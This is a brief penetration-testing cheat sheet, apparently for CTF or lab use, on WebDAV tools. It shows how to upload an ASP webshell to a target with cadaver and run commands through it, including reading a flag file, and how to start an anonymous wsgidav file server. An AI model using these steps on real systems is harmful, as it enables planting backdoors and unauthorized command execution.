# $ cadaver

Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

```bash
$ cadaver
> open http://target/webdav
 username: ...
 password: ...
> put /usr/share/webshells/asp/webshell.asp # put webshell to server
# open webshell in web browser

http://target/webdav/webshell.asp?cmd=whoami
http://target/webdav/webshell.asp?cmd=dir+C%3A%5C
http://target/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
```
# wsgidav
```bash
# Share filesystem folder '/temp' for anonymous access (no config file used):
# to use server simply paste host addres to File Explorer in Windows
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
```bash
wsgidav -H 0.0.0.0 -p 80 -r $(realpath .) --auth anonymous
```
some info to consider: https://trustedsec.com/blog/how-to-set-up-a-quick-simple-webdav-server-for-remote-file-sharing
